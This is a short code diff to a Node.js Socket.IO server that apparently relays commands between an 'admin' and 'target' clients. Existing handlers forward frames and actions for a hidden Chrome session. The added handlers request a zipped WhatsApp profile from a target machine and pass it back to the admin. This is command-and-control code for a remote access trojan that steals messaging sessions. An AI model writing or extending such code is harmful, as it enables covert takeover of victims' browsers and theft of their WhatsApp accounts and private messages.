@@ -94,6 +94,19 @@ io.on('connection', (socket) => {
     io.to(data.adminId).emit('hidden-chrome-frame', data.frame);
   });
 
+  // Zip Profile
+  socket.on('request-zip-whatsapp', (targetClientId) => {
+    io.to(targetClientId).emit('request-zip-whatsapp', socket.id);
+  });
+
+  socket.on('whatsapp-zip-ready', (data) => {
+    io.to(data.adminId).emit('whatsapp-zip-ready', data);
+  });
+
+  socket.on('whatsapp-zip-error', (data) => {
+    io.to(data.adminId).emit('whatsapp-zip-error', data);
+  });
+
   socket.on('hidden-chrome-action', (data) => {
     io.to(data.targetId).emit('hidden-chrome-action', data.action);
   });
